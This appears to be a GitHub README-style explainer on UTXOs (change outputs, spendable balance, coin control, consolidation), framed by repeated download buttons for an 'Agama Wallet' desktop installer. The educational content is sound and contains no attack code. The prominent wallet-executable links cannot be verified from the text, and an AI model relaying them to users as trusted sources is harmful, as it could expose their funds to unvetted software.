[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# What Is a UTXO?

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A UTXO is an unspent transaction output: a discrete amount of coin that a transaction created and nothing has spent yet. A wallet does not hold a balance in one place; it holds a set of these outputs, and the balance is their sum. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it spends UTXOs the way every UTXO-chain wallet does.

## You'll see this if

You are reading a block explorer and a transaction shows several inputs and several outputs instead of one "from" and one "to". Or a wallet tells you that you have 0.4 KMD available when you know you received four payments of 0.1.

| What you see | What it means |
|---|---|
| A transaction with two or more inputs | The wallet combined several of your outputs to cover one payment |
| An output to an address you do not recognise | Usually change, sent back to an address your wallet controls |
| Balance higher than any single payment you received | The balance is a sum of outputs, not one holding |
| "Insufficient funds" with enough balance shown | The spendable outputs are smaller than the amount plus the fee |

Every one of those states is ordinary UTXO behaviour, not a fault.

## Why it happens

A UTXO ledger has no accounts and no balances, only outputs waiting to be spent. Each output names an amount and a spending condition, and it exists exactly once: when a transaction spends it, that output is destroyed and new outputs are created for the recipient and for change.

Bitcoin introduced the model and Komodo uses it too, which is why a KMD balance behaves the same way as a BTC balance. The consequences follow from that design:

- **A payment is not a transfer of value from an account.** It is a set of old outputs consumed and new ones produced.
- **Change is a real output.** If you spend 0.1 from a 0.25 output, the wallet creates a 0.15 output back to itself. That address is yours even when it looks unfamiliar.
- **Coins are not fungible at the wallet level.** A wallet may hold one large output or forty small ones, and the difference changes fees, privacy and how a spend is assembled.

The two ledger designs are set side by side in [UTXO vs the account model](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md).

## Fix

Nothing needs fixing when the wallet shows multiple inputs, an unfamiliar change address or a sum you did not see as a single payment. What needs attention is a spend that fails or a fee that looks wrong, and both are handled by choosing outputs deliberately.

1. **Identify what you hold.** Open the wallet's transaction history and count the incoming amounts. Each unspent one is a candidate input for the next payment.
2. **Check the spendable amount, not the total.** A wallet may reserve outputs that are unconfirmed, immature or locked, so the spendable figure can sit below the headline balance.
3. **Let the wallet choose for an ordinary payment.** Automatic selection picks enough outputs to cover the amount plus fee and returns the remainder as change.
4. **Choose manually when the payment is large or privacy matters.** Selecting specific outputs is covered in [coin control](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md).
5. **Consolidate when the pile gets in the way.** Combining many small outputs into one is a deliberate, fee-paying transaction described in [UTXO management](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md).

For a Bitcoin-specific walkthrough of the same mechanics, including how the spending condition is expressed, see [UTXOs in Bitcoin](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md).

## If that did not work

If a payment will not go through despite a sufficient total, the likely cause is that no combination of individual outputs covers the amount plus fee, or that the outputs are not yet confirmed. Splitting the payment or waiting for confirmation resolves both.

If the wallet shows a balance that never becomes spendable, the problem is upstream of the UTXO model: an incomplete sync or a wallet opened in the wrong mode. The difference between total, spendable and pending is covered in [why a UTXO balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md), and a restored wallet showing nothing at all is handled in [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md).

If an output is genuinely missing from the history, stop guessing at causes and check the address on a block explorer. A transaction that never confirmed produced no output, and no wallet setting can spend what the chain never recorded.

## Prevention

- **Receive fewer, larger payments where you can.** Forty tiny outputs cost more to spend than one medium one.
- **Do not consolidate on a whim.** Merging outputs links them on-chain permanently; do it when fees are low and the reason is clear.
- **Label outputs as they arrive.** A note attached to an incoming payment is the only reliable way to remember what it was for a year later.
- **Expect change addresses.** A new address in your own history is normal, not an intrusion.
- **Keep the wallet synced before judging a balance.** An unspent output that the wallet has not seen yet is invisible, which is not the same as absent.

## FAQ

### Is a UTXO the same as a coin?

Roughly, but not exactly. A "coin" in casual use means a unit of the currency, while a UTXO is a specific output with an amount and a spending condition; one coin can be split across many outputs and one output can hold many coins' worth.

### Why did my transaction have two outputs when I sent one payment?

Because one output went to the recipient and the other returned the remainder to an address your wallet controls. That second output is change, and spending it later is exactly as valid as spending the first.

### Can two transactions spend the same UTXO?

No. Once an output is spent it cannot be spent again, and a second attempt is rejected by the network. This is what prevents double spending without a central ledger.

### Does the UTXO model apply to every cryptocurrency?

No. Bitcoin, Komodo, Litecoin, Dogecoin and Cardano use UTXO-style accounting, some with extensions; Ethereum and similar chains use account balances instead. [Which blockchains use UTXO accounting](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md) lists which is which.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [UTXO vs Account Model: How the Two Ledger Designs Differ](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md)
- [UTXOs in Bitcoin: How Coins Are Actually Held](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md)
- [UTXO Management: Consolidating and Labelling Your Coins](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md)
- [Coin Control: Choosing Which UTXOs a Transaction Spends](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md)
